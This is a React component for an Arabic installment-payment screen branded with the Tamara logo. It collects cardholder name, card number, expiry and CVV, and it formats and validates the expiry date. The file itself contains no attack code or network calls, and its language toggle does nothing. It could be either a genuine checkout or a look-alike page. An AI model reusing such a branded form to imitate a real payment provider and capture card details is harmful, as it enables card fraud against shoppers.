import { toEnglishNumbers, formatPrice } from '@/lib/utils';
import TamaraLogo from '@/components/TamaraLogo';

interface CardInfoProps {
  cardName: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
  setCardName: (value: string) => void;
  setCardNumber: (value: string) => void;
  setCardExpiry: (value: string) => void;
  setCardCvv: (value: string) => void;
  onBack: () => void;
  onSubmit: () => void;
  selectedPlan?: {
    totalAmount: number;
    installmentsCount: number;
    perInstallment: number;
  } | null;
}

const formatExpiry = (value: string): string => {
  const digits = toEnglishNumbers(value).replace(/\D/g, '');

  if (digits.length === 0) return '';

  if (digits.length === 1) {
    const first = parseInt(digits[0]);
    if (first > 1) return '0' + digits[0] + '/';
    return digits[0];
  }

  let month = digits.slice(0, 2);
  const monthNum = parseInt(month);

  if (monthNum > 12) month = '12';
  if (monthNum === 0) month = '01';

  const year = digits.slice(2, 4);

  if (digits.length >= 2) {
    return month + (year.length > 0 ? '/' + year : '/');
  }

  return month;
};

const isValidExpiry = (value: string): boolean => {
  const digits = toEnglishNumbers(value).replace(/\D/g, '');
  if (digits.length !== 4) return false;

  const month = parseInt(digits.slice(0, 2));
  if (month < 1 || month > 12) return false;

  const year = parseInt('20' + digits.slice(2, 4));
  const now = new Date();
  const expiry = new Date(year, month - 1);

  return expiry >= new Date(now.getFullYear(), now.getMonth());
};

// Card brand icons component
const CardBrandIcons = () => (
  <div className="flex items-center gap-2">
    {/* Visa */}
    <div className="w-10 h-6 bg-white rounded flex items-center justify-center">
      <svg width="28" height="9" viewBox="0 0 48 16" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M17.68 1.5L15.52 14.5H19.36L21.52 1.5H17.68ZM12.16 1.5L8.48 9.86L7.84 7.34C6.88 4.54 4.16 2.54 1.12 1.5H1.2L5.92 14.5H10.08L16.32 1.5H12.16ZM42.88 9.5C42.88 6.9 38.24 5.5 38.24 3.9C38.24 3.3 38.88 2.62 40.32 2.46C41.12 2.38 43.04 2.3 45.2 3.42L45.84 0.3C44.72 -0.14 43.28 -0.3 41.6 -0.3C37.6 -0.3 34.72 1.74 34.72 4.46C34.72 6.38 36.72 7.42 38.24 8.06C39.84 8.7 40.4 9.1 40.4 9.74C40.4 10.7 39.28 11.18 37.28 11.18C35.76 11.18 33.84 10.78 32.64 10.22L32 13.42C33.28 13.98 35.36 14.22 37.52 14.22C41.84 14.22 44.56 12.22 44.56 9.42C44.56 7.18 42.56 6.06 40.8 5.34C39.28 4.7 38.64 4.38 38.64 3.78C38.64 3.26 39.28 2.74 40.88 2.74C42.16 2.74 43.68 3.06 44.72 3.5L45.36 0.38C44.24 -0.06 42.72 -0.22 40.96 -0.22C37.12 -0.22 34.4 1.82 34.4 4.54C34.4 6.46 36.32 7.5 37.92 8.14C39.52 8.78 40.08 9.18 40.08 9.74H42.88V9.5ZM28.48 1.5H25.28C24.4 1.5 23.68 1.74 23.28 2.62L17.6 14.5H22L22.72 12.78H27.92L28.32 14.5H32.16L28.48 1.5ZM24 9.66L25.76 5.42L26.72 9.66H24Z" fill="#1A1F71"/>
      </svg>
    </div>
    {/* Mastercard */}
    <div className="w-10 h-6 bg-white rounded flex items-center justify-center">
      <svg width="20" height="12" viewBox="0 0 32 20" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="10" cy="10" r="10" fill="#EB001B"/>
        <circle cx="22" cy="10" r="10" fill="#F79E1B"/>
        <path d="M16 3C17.66 4.89 18.5 7.35 18.5 10C18.5 12.65 17.66 15.11 16 17C14.34 15.11 13.5 12.65 13.5 10C13.5 7.35 14.34 4.89 16 3Z" fill="#FF5F00"/>
      </svg>
    </div>
    {/* Mada */}
    <div className="w-10 h-6 bg-white rounded flex items-center justify-center">
      <svg width="24" height="8" viewBox="0 0 48 16" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M8 0H0V16H8C12.4183 16 16 12.4183 16 8C16 3.58172 12.4183 0 8 0Z" fill="#00A651"/>
        <path d="M24 0H16V16H24C28.4183 16 32 12.4183 32 8C32 3.58172 28.4183 0 24 0Z" fill="#8DC63F"/>
        <path d="M40 0H32V16H40C44.4183 16 48 12.4183 48 8C48 3.58172 44.4183 0 40 0Z" fill="#ED1C24"/>
        <path d="M8 0C3.58172 0 0 3.58172 0 8C0 12.4183 3.58172 16 8 16V0Z" fill="#0072CE"/>
      </svg>
    </div>
    {/* Amex */}
    <div className="w-10 h-6 bg-white rounded flex items-center justify-center">
      <svg width="20" height="12" viewBox="0 0 32 20" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect width="32" height="20" rx="2" fill="#016FD0"/>
        <path d="M4 10H6L7 7.5L8 10H10L8.5 6L10 2H8L7 4.5L6 2H4L5.5 6L4 10ZM11 2V10H15V8H13V6.5H15V5H13V3.5H15V2H11ZM16 2V10H20V8H18V2H16ZM21 2L22.5 10H25L26 4.5L27 10H29.5L31 2H29L28 7.5L27 2H25L24 7.5L23 2H21Z" fill="white"/>
      </svg>
    </div>
  </div>
);

const CardInfo = ({
  cardName,
  cardNumber,
  cardExpiry,
  cardCvv,
  setCardName,
  setCardNumber,
  setCardExpiry,
  setCardCvv,
  onBack,
  onSubmit,
  selectedPlan,
}: CardInfoProps) => {
  const expiryInvalid = cardExpiry.length > 0 && !isValidExpiry(cardExpiry);
  const isFormValid = !!(cardNumber && cardExpiry && cardCvv && cardName && isValidExpiry(cardExpiry));

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value;
    const prev = cardExpiry;

    const isDeleting = raw.length < prev.length;
    if (isDeleting) {
      if (prev.endsWith('/') && raw === prev.slice(0, -1)) {
        setCardExpiry(raw.slice(0, -1));
      } else {
        setCardExpiry(raw);
      }
      return;
    }

    const formatted = formatExpiry(raw);
    setCardExpiry(formatted);
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = toEnglishNumbers(e.target.value).replace(/\D/g, '');
    const formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
    setCardNumber(formatted);
  };

  return (
    <div
      className="min-h-screen flex flex-col"
      dir="rtl"
      style={{ 
        fontFamily: "'Cairo', 'Tajawal', sans-serif",
        background: 'hsl(225 40% 8%)'
      }}
    >
      <div className="max-w-[430px] mx-auto w-full flex flex-col flex-1">
        {/* Header - Dark Theme */}
        <div className="flex items-center justify-between px-5 py-4">
          <TamaraLogo />
          <div className="flex items-center gap-3">
            <button
              onClick={() => {}}
              className="text-[14px] font-medium transition-colors hover:text-amber-400"
              style={{ color: 'hsl(43 80% 60%)' }}
            >
              English
            </button>
            <span style={{ color: 'hsl(225 25% 25%)' }}>|</span>
            <button
              onClick={onBack}
              aria-label="إغلاق"
              className="w-8 h-8 flex items-center justify-center rounded-full transition-all hover:bg-white/10"
              style={{ border: '1px solid hsl(225 25% 25%)' }}
            >
              <span className="text-lg leading-none" style={{ color: 'hsl(40 30% 92%)' }}>✕</span>
            </button>
          </div>
        </div>

        {/* Separator */}
        <div className="h-px" style={{ background: 'hsl(225 25% 18%)' }} />

        {/* Content */}
        <div className="px-5 py-6 flex flex-col flex-1">
          {/* Title Section - New Design with Card Brand Icons */}
          <div className="mb-6">
            <div className="flex items-center justify-between mb-2">
              <h1 className="text-[22px] font-bold text-right" style={{ color: 'hsl(40 30% 92%)' }}>
                أضف بطاقة جديدة
              </h1>
              <CardBrandIcons />
            </div>
            <p className="text-[14px] text-right" style={{ color: 'hsl(220 15% 55%)' }}>
              سيتم التحقق من بطاقتك تلقائياً
            </p>
          </div>

          {/* Selected Plan Section - New Design */}
          {selectedPlan && (
            <div 
              className="mb-6 p-4 rounded-xl"
              style={{ 
                background: 'hsl(225 35% 12%)',
                border: '1px solid hsl(225 25% 25%)'
              }}
            >
              <div className="flex items-center justify-between mb-3">
                <span className="text-[14px] font-medium" style={{ color: 'hsl(220 15% 55%)' }}>
                  الخطة المختارة
                </span>
                <span 
                  className="px-3 py-1 rounded-full text-[12px] font-semibold"
                  style={{ 
                    background: 'hsl(43 74% 49% / 0.2)',
                    color: 'hsl(43 80% 60%)'
                  }}
                >
                  {selectedPlan.installmentsCount} دفعات
                </span>
              </div>
              <div className="flex items-center justify-between">
                <div className="text-right">
                  <div className="text-[24px] font-bold" style={{ color: 'hsl(40 30% 92%)' }}>
                    {formatPrice(selectedPlan.totalAmount)} <span className="text-[14px] font-normal">ريال</span>
                  </div>
                  <div className="text-[12px]" style={{ color: 'hsl(220 15% 55%)' }}>
                    {selectedPlan.installmentsCount} دفعات × {formatPrice(selectedPlan.perInstallment)} ريال
                  </div>
                </div>
                <div 
                  className="w-12 h-12 rounded-full flex items-center justify-center"
                  style={{ 
                    background: 'linear-gradient(135deg, hsl(43 74% 49%) 0%, hsl(35 80% 45%) 100%)'
                  }}
                >
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2L15.09 8.26L22 9.27L17 14.14L18.18 21.02L12 17.77L5.82 21.02L7 14.14L2 9.27L8.91 8.26L12 2Z" fill="hsl(225 40% 8%)"/>
                  </svg>
                </div>
              </div>
            </div>
          )}

          {/* Card Preview Visual */}
          <div 
            className="relative w-full aspect-[1.586/1] rounded-2xl mb-6 overflow-hidden"
            style={{
              background: 'linear-gradient(135deg, hsl(43 74% 49%) 0%, hsl(35 80% 45%) 50%, hsl(43 74% 55%) 100%)',
              boxShadow: '0 10px 40px -10px hsl(43 74% 49% / 0.4)'
            }}
          >
            {/* Card Pattern Overlay */}
            <div 
              className="absolute inset-0 opacity-20"
              style={{
                backgroundImage: `url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='1'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E")`
              }}
            />
            
            {/* Card Chip */}
            <div 
              className="absolute top-8 right-6 w-12 h-10 rounded-md"
              style={{
                background: 'linear-gradient(135deg, #d4af37 0%, #f4e4ba 50%, #d4af37 100%)'
              }}
            />
            
            {/* Card Number Display */}
            <div 
              className="absolute top-20 right-6 text-lg tracking-[0.2em] font-mono"
              style={{ color: 'hsl(40 30% 98%)' }}
            >
              {cardNumber ? cardNumber : '•••• •••• •••• ••••'}
            </div>
            
            {/* Card Details Row */}
            <div className="absolute bottom-8 right-6 left-6 flex justify-between items-end">
              <div>
                <div className="text-[10px] uppercase mb-1" style={{ color: 'hsl(40 30% 85%)' }}>حامل البطاقة</div>
                <div className="text-sm font-medium tracking-wide" style={{ color: 'hsl(40 30% 98%)' }}>
                  {cardName || 'الاسم كما يظهر على البطاقة'}
                </div>
              </div>
              <div className="text-left">
                <div className="text-[10px] uppercase mb-1" style={{ color: 'hsl(40 30% 85%)' }}>تاريخ الانتهاء</div>
                <div className="text-sm font-medium" style={{ color: 'hsl(40 30% 98%)' }}>
                  {cardExpiry || '••/••'}
                </div>
              </div>
            </div>
          </div>

          {/* Card Name Input */}
          <div className="mb-4">
            <label 
              className="text-[14px] font-medium block mb-2 text-right"
              style={{ color: 'hsl(40 30% 92%)' }}
            >
              اسم حامل البطاقة
            </label>
            <input
              value={cardName}
              onChange={e => setCardName(e.target.value)}
              placeholder="الاسم كما يظهر على البطاقة"
              className="w-full px-4 py-3 text-[15px] rounded-[10px] outline-none placeholder-[#aaa]"
              style={{ 
                border: '1px solid hsl(225 25% 25%)',
                backgroundColor: 'hsl(225 35% 12%)',
                color: 'hsl(40 30% 92%)',
                direction: 'ltr'
              }}
              maxLength={100}
            />
          </div>

          {/* Card Number Input */}
          <div className="mb-4">
            <label 
              className="text-[14px] font-medium block mb-2 text-right"
              style={{ color: 'hsl(40 30% 92%)' }}
            >
              رقم البطاقة
            </label>
            <input
              value={cardNumber}
              onChange={handleCardNumberChange}
              placeholder="XXXX XXXX XXXX XXXX"
              className="w-full px-4 py-3 text-[15px] rounded-[10px] outline-none placeholder-[#aaa] text-center"
              style={{ 
                border: '1px solid hsl(225 25% 25%)',
                backgroundColor: 'hsl(225 35% 12%)',
                color: 'hsl(40 30% 92%)',
                letterSpacing: '0.2em',
                direction: 'ltr'
              }}
              maxLength={19}
            />
          </div>

          {/* Expiry and CVV */}
          <div className="grid grid-cols-2 gap-3 mb-6">
            <div>
              <label 
                className="text-[14px] font-medium block mb-2 text-right"
                style={{ color: 'hsl(40 30% 92%)' }}
              >
                تاريخ الانتهاء
              </label>
              <input
                value={cardExpiry}
                onChange={handleExpiryChange}
                placeholder="MM/YY"
                className="w-full px-4 py-3 text-[15px] rounded-[10px] outline-none placeholder-[#aaa] text-center"
                style={{ 
                  border: expiryInvalid 
                    ? '1px solid hsl(0 84% 60%)' 
                    : '1px solid hsl(225 25% 25%)',
                  backgroundColor: 'hsl(225 35% 12%)',
                  color: 'hsl(40 30% 92%)',
                  direction: 'ltr'
                }}
                maxLength={5}
              />
              {expiryInvalid && (
                <p className="text-xs mt-1 text-right" style={{ color: 'hsl(0 84% 60%)' }}>تاريخ انتهاء غير صالح</p>
              )}
            </div>
            <div>
              <label 
                className="text-[14px] font-medium block mb-2 text-right"
                style={{ color: 'hsl(40 30% 92%)' }}
              >
                CVV
              </label>
              <input
                value={cardCvv}
                onChange={e => setCardCvv(toEnglishNumbers(e.target.value))}
                placeholder="•••"
                type="password"
                className="w-full px-4 py-3 text-[15px] rounded-[10px] outline-none placeholder-[#aaa] text-center"
                style={{ 
                  border: '1px solid hsl(225 25% 25%)',
                  backgroundColor: 'hsl(225 35% 12%)',
                  color: 'hsl(40 30% 92%)',
                  direction: 'ltr'
                }}
                maxLength={4}
              />
            </div>
          </div>

          {/* Spacer */}
          <div className="flex-1" />
        </div>

        {/* Fixed Bottom Button - Payment Button */}
        <div 
          className="fixed bottom-0 left-0 right-0 p-4"
          style={{ 
            background: 'hsl(225 35% 12%)',
            borderTop: '1px solid hsl(225 25% 18%)'
          }}
        >
          <div className="max-w-2xl mx-auto">
            <button
              onClick={onSubmit}
              disabled={!isFormValid}
              className="w-full py-4 font-bold rounded-[10px] transition-all flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
              style={{
                background: isFormValid 
                  ? 'linear-gradient(135deg, hsl(43 74% 49%) 0%, hsl(35 80% 45%) 100%)' 
                  : 'hsl(225 25% 18%)',
                color: isFormValid ? 'hsl(225 40% 8%)' : 'hsl(220 15% 55%)',
                cursor: isFormValid ? 'pointer' : 'not-allowed',
                boxShadow: isFormValid ? '0 4px 20px -2px hsl(43 74% 49% / 0.3)' : 'none'
              }}
            >
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <rect x="2" y="5" width="20" height="14" rx="2" stroke="currentColor" strokeWidth="2"/>
                <line x1="2" y1="10" x2="22" y2="10" stroke="currentColor" strokeWidth="2"/>
              </svg>
              ادفع الآن
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CardInfo;
